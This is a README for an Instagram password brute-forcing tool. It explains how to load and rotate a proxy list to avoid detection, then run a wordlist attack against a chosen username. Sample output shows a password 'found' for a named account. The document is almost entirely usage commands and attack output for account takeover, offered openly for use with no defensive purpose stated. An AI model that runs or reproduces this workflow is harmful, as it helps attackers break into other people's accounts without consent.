### instagrambruteforcer
For Questions Telegram: https://t.me/cyberalphabit Email Me: darkknightgeeky@gmail.com
![exploit](https://github.com/DarkKnightGeeky/instagrambruteforcer/blob/main/Instagrambruteforcer.png)
## Requirements


- Python _v3.11_
- proxy list
## Proxies

The system needs a list of proxies to work. Once uploaded, proxies are saved into a database.<br/>

### Upload

Upload a list of proxies into the program. The proxy file must have a format of `ip:port`<br/>

`proxies_list.txt`

```
3.238.111.248:80
206.189.59.192:8118
165.22.81.30:34100
176.248.120.70:3128
191.242.178.209:3128
180.92.194.235:80
```

To upload a list of proxies a similar syntax must be followed.

```
python3 instagrambruteforcer.py -px <path to proxy list>
```

### Stats

This gives an insight into the health of the proxies in the database.

```
python3 instagrambruteforcer.py --stats
```

### Prune

This allows the able to get rid of proxies with a score below a given score.<br/>
It is recommended that you run the `--stats` and prune the database of proxies<br/>
who have a proxy score below `Q1`.

```
python3 instagrambruteforcer.py --prune 0.05
```

Pruning is not a requirement because the <br/>
the system will automatically learn which proxies perform poorly and stop using them.

### Usage

```
python3 instagrambruteforcer.py -u <username> -p <passlist>
```

### Execute

```
[-] Wordlist: passlist.txt
[-] Username: Lopezrita56
[-] Password: 357
[-] Complete: 45.51%
[-] Attempts: 228
[-] Browsers: 273
[-] Exists: True
```

### Stop

```
[-] Wordlist: passlist.txt
[-] Username: Lopezrita56
[-] Password: Lopez123
[-] Complete: 62.67%
[-] Attempts: 413
[-] Browsers: 145
[-] Exists: True

[!] Password Found
[+] Username: Lopezrita56
[+] Password: Lopez123
```
